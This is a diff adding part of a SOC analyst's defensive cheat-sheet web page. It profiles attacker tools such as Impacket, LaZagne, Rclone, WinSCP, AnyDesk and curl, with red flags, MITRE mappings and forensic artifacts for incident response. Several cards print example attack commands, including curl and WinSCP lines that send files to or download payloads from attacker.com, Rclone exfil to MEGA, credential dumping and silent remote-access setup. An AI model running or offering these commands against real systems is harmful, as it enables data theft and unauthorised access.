+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">Event 4769 bulk = Kerberoasting</span>
+            <span class="rflag">Event 4768 with RC4 (downgrade)</span>
+            <span class="rflag">Rubeus.exe in any location</span>
+            <span class="rflag">Service ticket requests from non-svc account</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1558/003/" target="_blank">T1558.003</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="offensive" data-tags="bloodhound sharphound active directory ldap path domain admin">
+      <div class="tool-card__header">
+        <span class="tool-card__name">BloodHound / SharpHound</span>
+        <span class="tool-card__cat cat--offensive">Offensive</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">AD attack path visualization tool.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>SharpHound collects AD data: users, groups, ACLs, sessions</li>
+            <li>Identifies shortest path to Domain Admin</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">LDAP query storm from single host</span>
+            <span class="rflag">Event 4662 spike</span>
+            <span class="rflag">SharpHound.exe / .ps1 anywhere</span>
+            <span class="rflag">*_computers.json / *_users.json artifacts</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1069/" target="_blank">T1069</a> / <a href="https://attack.mitre.org/techniques/T1087/" target="_blank">T1087</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="offensive" data-tags="impacket secretsdump wmiexec smbexec ntds python apt41 lazarus">
+      <div class="tool-card__header">
+        <span class="tool-card__name">Impacket</span>
+        <span class="tool-card__cat cat--offensive">Offensive</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Python network protocol toolkit (wmiexec, secretsdump, psexec.py).</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>secretsdump.py — remote NTDS.dit and SAM extraction</li>
+            <li>wmiexec.py — shell over WMI without dropping binary</li>
+            <li>Used by APT41, Lazarus, Iranian/Chinese APT groups</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">Event 4624 type 3 from unexpected src</span>
+            <span class="rflag">C:\Windows\__output temp file (wmiexec)</span>
+            <span class="rflag">BTOBTO service created (smbexec)</span>
+            <span class="rflag">ADMIN$ from non-standard hosts</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1003/" target="_blank">T1003</a> / <a href="https://attack.mitre.org/techniques/T1047/" target="_blank">T1047</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="offensive" data-tags="lazagne credential browser git wifi password recovery">
+      <div class="tool-card__header">
+        <span class="tool-card__name">LaZagne</span>
+        <span class="tool-card__cat cat--offensive">Offensive</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Open-source credential recovery tool.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Recovers stored passwords from 60+ apps (browsers, Git, WiFi)</li>
+            <li>Used by RansomEXX, Nefilim, NetWalker</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">lazagne.exe all
+lazagne.exe browsers</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">lazagne.exe anywhere = confirmed theft</span>
+            <span class="rflag">Often renamed — check PE imports</span>
+            <span class="rflag">Browser credential files accessed in bulk</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1555/" target="_blank">T1555</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="offensive" data-tags="adfind active directory lockbit black basta conti topology">
+      <div class="tool-card__header">
+        <span class="tool-card__name">AdFind</span>
+        <span class="tool-card__cat cat--offensive">Offensive</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Free AD query tool (legitimate admin use).</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Dumps AD topology: users, computers, OUs, GPOs, trusts</li>
+            <li>Used by LockBit, Black Basta, Akira, Conti pre-ransomware</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">adfind.exe -f "(objectcategory=computer)" -csv
+adfind.exe -gcb -sc trustdmp</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">Running on workstation (not DC)</span>
+            <span class="rflag">CSV/text AD data output</span>
+            <span class="rflag">Non-IT user running it</span>
+            <span class="rflag">Often renamed — check PE metadata</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1018/" target="_blank">T1018</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         REMOTE ACCESS
+    ══════════════════════════════════════════ -->
+
+    <div class="tool-card" data-cat="remote" data-tags="anydesk rdm remote access ransomware hunters royal black basta">
+      <div class="tool-card__header">
+        <span class="tool-card__name">AnyDesk</span>
+        <span class="tool-card__cat cat--remote">Remote Access</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Remote desktop application — legitimate IT tool.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Installed silently as persistent service with attacker password</li>
+            <li>AnyDesk = access, WinSCP = exfil (common ransomware combo)</li>
+            <li>Used by Hunters International, Royal, Black Basta</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">anydesk.exe --install C:\ProgramData\AnyDesk --start-with-windows
+anydesk.exe --set-password &lt;password&gt;</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">AnyDesk on servers</span>
+            <span class="rflag">Running as SYSTEM service</span>
+            <span class="rflag">Installed in %APPDATA% / %TEMP%</span>
+            <span class="rflag">Port 7070 inbound</span>
+            <span class="rflag">Check: C:\ProgramData\AnyDesk\ad.trace</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1219/" target="_blank">T1219</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="remote" data-tags="screenconnect connectwise cve-2024-1709 muddywater black basta rmm">
+      <div class="tool-card__header">
+        <span class="tool-card__name">ScreenConnect (ConnectWise)</span>
+        <span class="tool-card__cat cat--remote">Remote Access</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Remote support / RMM platform.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>CVE-2024-1709 auth bypass exploited in the wild</li>
+            <li>Used by MuddyWater (Iran), Black Basta</li>
+            <li>Multiple instances with different hashes = different attacker sessions</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">Installed on non-helpdesk systems</span>
+            <span class="rflag">Service: ScreenConnect Client (&lt;hash&gt;)</span>
+            <span class="rflag">Outbound to *.screenconnect.com</span>
+            <span class="rflag">Installed via PowerShell / %TEMP%</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1219/" target="_blank">T1219</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="remote" data-tags="ngrok tunnel c2 bypass firewall pioneer kitten iran">
+      <div class="tool-card__header">
+        <span class="tool-card__name">ngrok</span>
+        <span class="tool-card__cat cat--remote">Remote Access</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Tunnel service — exposes local services to internet via HTTPS.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Bypasses egress firewall controls — no static C2 IP</li>
+            <li>Creates HTTPS tunnel to attacker endpoint</li>
+            <li>Used by Pioneer Kitten (Iran), eCrime actors</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">ngrok.exe on production system</span>
+            <span class="rflag">DNS to *.ngrok.io / *.ngrok-free.app</span>
+            <span class="rflag">Localhost forwarding to external tunnel</span>
+            <span class="rflag">Often renamed — check tunnel config</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1572/" target="_blank">T1572</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         EXFILTRATION
+    ══════════════════════════════════════════ -->
+
+    <div class="tool-card" data-cat="exfil" data-tags="rclone exfil mega lockbit black basta conti clop cloud sync">
+      <div class="tool-card__header">
+        <span class="tool-card__name">Rclone</span>
+        <span class="tool-card__cat cat--exfil">Exfiltration</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Cloud sync CLI tool — #1 ransomware exfiltration tool (57% of incidents).</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Syncs data to MEGA, Google Drive, S3, Dropbox</li>
+            <li>Used by LockBit, Black Basta, BlackSuit, Conti, Clop</li>
+            <li>Often renamed (svchost.exe, update.exe) — check PE metadata</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">rclone copy C:\Shares\ mega:exfil/ --no-traverse -q
+rclone sync \\server\finance remote:stolen --transfers 10</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">rclone.exe anywhere = active exfil</span>
+            <span class="rflag">%APPDATA%\rclone\rclone.conf</span>
+            <span class="rflag">Outbound to MEGA / GDrive / S3</span>
+            <span class="rflag">Large volume outbound transfers</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1567/" target="_blank">T1567</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="exfil" data-tags="winscp sftp ftp exfil anydesk combo ransomware agenda qilin blackcat lockbit akira black basta ini registry script silent headless">
+      <div class="tool-card__header">
+        <span class="tool-card__name">WinSCP</span>
+        <span class="tool-card__cat cat--exfil">Exfiltration</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">SFTP/SCP/FTP client — #2 ransomware exfiltration tool. Encrypts traffic making DLP inspection difficult. Supports fully headless scripted transfers — invisible to logged-in users.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Headless scripted exfil: winscp.exe /script= or /command= — no GUI, no user prompt, fully automated</li>
+            <li>/ini=nul flag deliberately suppresses registry artifact creation — attacker destroying evidence in real time</li>
+            <li>SFTP encrypts the transfer — DLP and network inspection tools can't see file content</li>
+            <li>AnyDesk = persistent access, WinSCP = exfil — classic ransomware combo (your incident type)</li>
+            <li>BlackCat/ALPHV (2023): malvertizing campaign via Google Ads served trojanized WinSCP installer bundling a Cobalt Strike beacon</li>
+            <li>Used to push Linux ransomware to ESXi hosts: WinSCP uploads .elf, PuTTY/SSH executes it remotely</li>
+            <li>Portable version (WinSCP-Portable.zip) — no install, no registry, dropped to %TEMP% and wiped after use</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code"># Headless scripted SFTP exfil (no GUI window)
+winscp.exe /script=C:\Users\Public\exfil.txt
+
+# Inline command — no script file on disk
+winscp.exe /command "open sftp://user:password@attacker.com/" "put C:\Users\*\Documents\*.docx /upload/" "exit"
+
+# /ini=nul — no registry entries written (HIGH CONFIDENCE MALICIOUS)
+winscp.exe /ini=nul /script=exfil.txt
+
+# Hostkey bypass — non-interactive, accepts any SSH key
+winscp.exe /command "open sftp://user:pass@1.2.3.4 -hostkey=""*""" "synchronize remote C:\CriticalData /upload" "exit"
+
+# Silent install (attacker-deployed)
+winscp.exe /VERYSILENT /NORESTART</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">WinSCP on server / DC (no business use)</span>
+            <span class="rflag">/script= or /command= flags</span>
+            <span class="rflag">/ini=nul flag = evidence destruction</span>
+            <span class="rflag">Executed by SYSTEM / service account</span>
+            <span class="rflag">Spawned by cmd / PowerShell / scheduled task</span>
+            <span class="rflag">Outbound port 22 (SFTP) to external IP</span>
+            <span class="rflag">WinSCP + AnyDesk on same host</span>
+            <span class="rflag">WinSCP.ini in %TEMP% / C:\Users\Public</span>
+            <span class="rflag">Preceded by 7-Zip / WinRAR staging activity</span>
+            <span class="rflag">Portable ZIP extracted to %TEMP%</span>
+            <span class="rflag">Large bytes-sent in SRUM DB for winscp.exe</span>
+            <span class="rflag">Registry: History\RemoteTarget = unknown external IP</span>
+          </div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Registry forensic keys</div>
+          <div class="tool-card__code"># Remote destinations — WHERE data went (gold for IR)
+HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\History\RemoteTarget
+
+# Local paths data was taken FROM
+HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Interface\Commander\LocalPanel\LastPath
+
+# SSH fingerprints of external hosts accepted
+HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\LastFingerprints
+
+# Saved sessions (hostname, username, protocol, paths)
+HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions\
+
+# NOTE: /ini=nul = none of the above will be populated</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Forensic artifacts</div>
+          <ul>
+            <li><strong>WinSCP.ini</strong> — same dir as winscp.exe; sessions, usernames, last paths, connected hosts</li>
+            <li><strong>SRUM DB</strong> — C:\Windows\System32\sru\SRUDB.dat — bytes sent/received per hour by winscp.exe — CRITICAL for quantifying exfil volume</li>
+            <li><strong>Prefetch</strong> — WINSCP.EXE-{HASH}.pf — execution evidence + referenced files</li>
+            <li><strong>Portable temp</strong> — %LOCALAPPDATA%\Temp\Temp*_WinSCP--Portable.zip</li>
+            <li><strong>AmCache / Shimcache</strong> — first/last execution timestamps</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Known threat actors</div>
+          <ul>
+            <li>BlackCat/ALPHV, Black Basta, LockBit 3.0, Akira, Medusa, BlackSuit</li>
+            <li>Agenda/Qilin ransomware, Gentlemen ransomware</li>
+            <li>Often paired with: Rclone, PuTTY/plink, 7-Zip, cURL, AnyDesk</li>
+          </ul>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1048/" target="_blank">T1048</a> / <a href="https://attack.mitre.org/techniques/T1567/" target="_blank">T1567</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="exfil" data-tags="curl http post download payload built-in windows exfil">
+      <div class="tool-card__header">
+        <span class="tool-card__name">curl.exe</span>
+        <span class="tool-card__cat cat--exfil">Exfiltration</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">HTTP client built into Windows 10+ — #3 ransomware exfil tool.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>POSTs stolen data to attacker server</li>
+            <li>Downloads payloads from C2</li>
+            <li>Always available — no installation needed</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">curl.exe -X POST http://attacker.com/collect -d @loot.txt
+curl.exe -o C:\Users\Public\p.exe http://attacker.com/p.exe
+curl.exe -k -T sensitive.zip ftp://attacker.com/</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">POST with -d @&lt;file&gt;</span>
+            <span class="rflag">-o downloading .exe</span>
+            <span class="rflag">-k ignoring SSL</span>
+            <span class="rflag">External non-business destination</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1105/" target="_blank">T1105</a> / <a href="https://attack.mitre.org/techniques/T1048/" target="_blank">T1048</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="exfil" data-tags="megasync mega cloud conti revil nefilim exfil storage">
+      <div class="tool-card__header">
+        <span class="tool-card__name">MEGAsync / MEGAcmd</span>
+        <span class="tool-card__cat cat--exfil">Exfiltration</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">MEGA cloud storage desktop client / CLI.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Used by Conti, REvil, Nefilim for cloud exfil</li>
+            <li>MEGAcmd enables scripted bulk transfers</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">MEGAsync on servers / DC</span>
+            <span class="rflag">Outbound to *.mega.nz API</span>
+            <span class="rflag">MEGAsync.exe in startup / as service</span>
+            <span class="rflag">MEGA login from corporate IPs</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1567/002/" target="_blank">T1567.002</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="exfil" data-tags="filezilla ftp sftp inc ransom exfil transfer">
+      <div class="tool-card__header">
+        <span class="tool-card__name">FileZilla</span>
+        <span class="tool-card__cat cat--exfil">Exfiltration</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">FTP/SFTP/FTPS client.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Large-scale FTP exfiltration — used by Inc Ransom</li>
+            <li>Supports scripted silent transfers</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">FileZilla on servers</span>
+            <span class="rflag">Outbound FTP (21) / FTPS (990)</span>
+            <span class="rflag">FileZilla.xml with external sessions</span>
+            <span class="rflag">Outside IT/dev workflow</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1048/" target="_blank">T1048</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ══════════════════════════════════════════
+       QUICK LOOKUP TABLE
+  ══════════════════════════════════════════ -->
+  <div class="ql-section">
+    <h2>&gt; Quick Incident Lookup</h2>
+    <table class="ql-table">
+      <thead>
+        <tr><th>Executable</th><th>First Question to Ask</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>powershell.exe</td><td>Is it encoded (-enc)? What's the parent process?</td></tr>
+        <tr><td>rundll32.exe</td><td>What DLL is it loading and from where?</td></tr>
+        <tr><td>regsvr32.exe</td><td>Is there a URL in the arguments?</td></tr>
+        <tr><td>mshta.exe</td><td>Is it loading from a URL or script?</td></tr>
+        <tr><td>wscript / cscript</td><td>What script is it running and where is it located?</td></tr>
+        <tr><td>msbuild.exe</td><td>Is it running outside a build pipeline? What user?</td></tr>
+        <tr><td>wmic.exe</td><td>Is it using /format:, process call create, or /node:?</td></tr>
+        <tr><td>schtasks.exe</td><td>Where does the task binary live? Is it on a remote host?</td></tr>
+        <tr><td>sc.exe</td><td>What's the binPath? Is it stopping security services?</td></tr>
+        <tr><td>vssadmin.exe</td><td>Is it deleting shadows? Treat as ransomware event.</td></tr>
+        <tr><td>fltMC.exe</td><td>Is it unloading a filter? Map filter name to security product.</td></tr>
+        <tr><td>esentutl.exe</td><td>Is it accessing NTDS.dit or a shadow copy path?</td></tr>
+        <tr><td>certutil.exe</td><td>Is it downloading a URL or decoding a file?</td></tr>
+        <tr><td>nltest.exe</td><td>What user ran it? Was it part of a recon chain?</td></tr>
+        <tr><td>cmdkey.exe</td><td>Was /list run? What followed it?</td></tr>
+        <tr><td>procdump.exe</td><td>Did it target lsass.exe? Where is the dump file?</td></tr>
+        <tr><td>PsExec</td><td>Is PSEXESVC on remote hosts? Check Event ID 7045.</td></tr>
+        <tr><td>Mimikatz</td><td>Check Sysmon Event 10 (lsass access) + DCSync Event 4662.</td></tr>
+        <tr><td>AnyDesk</td><td>Where is it installed? Is it a service? Check ad.trace log.</td></tr>
+        <tr><td>Rclone</td><td>Check rclone.conf for cloud credentials. What data was synced?</td></tr>
+        <tr><td>WinSCP</td><td>Check WinSCP.ini for sessions. Outbound port 22?</td></tr>
+        <tr><td>curl.exe</td><td>POST with -d @file? Download of .exe? External destination?</td></tr>
+        <tr><td>ngrok</td><td>DNS/connections to ngrok.io? Treat as active C2 tunnel.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <footer class="footer">
+    <p><span class="accent">&gt;</span> Niteesh Komurlekar · SOC Analyst</p>
+    <p class="footer__copy">© 2026 Niteesh.Komurlekar. All rights reserved.</p>
+  </footer>
+
+  <script>
+    const grid    = document.getElementById('csGrid');
+    const search  = document.getElementById('csSearch');
+    const filters = document.querySelectorAll('.cs-filter');
+    const empty   = document.getElementById('csEmpty');
+    const count   = document.getElementById('csCount');
+    const cards   = document.querySelectorAll('.tool-card');
+
+    let activeCat = 'all';
+
+    function update() {
+      const q = search.value.toLowerCase().trim();
+      let visible = 0;
+      cards.forEach(card => {
+        const catMatch = activeCat === 'all' || card.dataset.cat === activeCat;
+        const name = card.querySelector('.tool-card__name').textContent.toLowerCase();
+        const tags = (card.dataset.tags || '').toLowerCase();
+        const body = card.textContent.toLowerCase();
+        const qMatch = !q || name.includes(q) || tags.includes(q) || body.includes(q);
+        if (catMatch && qMatch) { card.classList.remove('hidden'); visible++; }
+        else card.classList.add('hidden');
+      });
+      count.textContent = visible + ' tools';
+      empty.classList.toggle('show', visible === 0);
+    }
+
+    filters.forEach(btn => {
+      btn.addEventListener('click', () => {
+        filters.forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        activeCat = btn.dataset.cat;
+        update();
+      });
+    });
+
+    search.addEventListener('input', update);
+    update();
+
+    // Nav scroll
+    window.addEventListener('scroll', () => {
+      document.getElementById('nav').classList.toggle('nav--scrolled', window.scrollY > 20);
+    });
+  </script>
+</body>
+</html>
